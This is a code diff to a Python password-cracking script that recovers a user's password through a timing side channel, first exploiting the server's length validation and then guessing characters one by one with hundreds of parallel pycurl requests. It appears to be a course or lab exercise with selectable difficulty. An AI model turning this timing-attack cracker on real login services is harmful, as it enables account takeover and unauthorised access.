@@ -2,10 +2,10 @@ import urllib.parse
 import time
 import string
 from concurrent.futures import ThreadPoolExecutor
+from Timer import ThreadSafeTimer
 import pycurl
 import io
 import threading
-from IPython.display import clear_output
 
 _thread_local = threading.local()
 
@@ -23,7 +23,7 @@ USERNAME = "326529229" # need to recieve
 
 # since threads wait for a long long time for I/O
 # it is possible and wanted to have a lot of threads
-NUMBER_OF_THREADS = 20*DIFFICULTY + 300
+NUMBER_OF_THREADS = 20*DIFFICULTY + 400
 
 PASSWORD = ""
 LENGTH = -1
@@ -73,14 +73,15 @@ def try_pass(password):
     buffer = io.BytesIO()
     c.setopt(pycurl.WRITEFUNCTION, buffer.write)
 
-    # Retry on transient errors
+    # will try to communicate with the server 
+    # a max amount of 5 times.
     for attempt in range(5):
         try:
             c.perform()
             break
         except pycurl.error as e:
             if attempt == 4:
-                raise  # give up after 5 tries
+                raise
 
     # Extract timings
     name_lookup = c.getinfo(pycurl.NAMELOOKUP_TIME)
@@ -190,23 +191,32 @@ def try_char(chars, discovered_length, char_timer):
 ### ---- main --------------- ###
 ### ------------------------- ###
 def main():
-    global PASSWORD, LENGTH, NUMBER_OF_THREADS, USERNAME
+    global PASSWORD, LENGTH, NUMBER_OF_THREADS, USERNAME, DIFFICULTY
 
     # Recieve User's ID
     USERNAME = input("Enter Your ID: ")
     while not try_pass("test").get("Status") == 200:
       print("Invalid ID")
       USERNAME = input("Enter Your ID: ")
+    ## Recieve difficulty
+    while True:
+      try:
+          DIFFICULTY = int(input("Enter Difficulty Level: "))
+          break
+      except ValueError:
+          print("That wasn’t an integer, try again!")
 
     attempt = 1
 
-    clear_output();
+    print("\033[H\033[J", end="")
+    
+    start = time.perf_counter()
     # Start Cracking (;
     with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
       correct = False
       while not correct:
-        #print(f".....Cracking User {USERNAME}'s Password, attempt {attempt}..." , end="\n\n")
-        #print("Password - " , end="")
+        print(f"Cracking password for User {USERNAME}, Difficulty {DIFFICULTY}. attempt {attempt}..." , end="\n\n")
+        print("Password - " , end = "", flush = True)
         try:
           # first step - exploit the server's length validation
           LENGTH, time_for_length = crack_password_length()
@@ -218,20 +228,25 @@ def main():
               PASSWORD += ch
               discovered_length += 1
               char_times.append(t)
-              print(ch, end="")
+              print(ch, end="", flush = True)
           correct = try_pass(PASSWORD).get('Data')
           if not correct:
             print("\nGENERATED PASSWORD IS INCORRECT, trying again...")
             PASSWORD = ""
             discovered_length=0
             time.sleep(3)
-            clear_output()
+            print("\033[H\033[J", end="")
+          else:
+            elapsed = time.perf_counter()-start
+            mins, secs = divmod(elapsed, 60)
+            print(f"\n\nElapsed Time: {int(mins):02d}:{secs:04.1f}")
         except Exception as e:
           print(f"\n[ERROR] - {e}")
           print("trying again...")
           PASSWORD = ""
           discovered_length=0
           time.sleep(3)
+          print("\033[H\033[J", end="")
         finally:
           attempt += 1
 
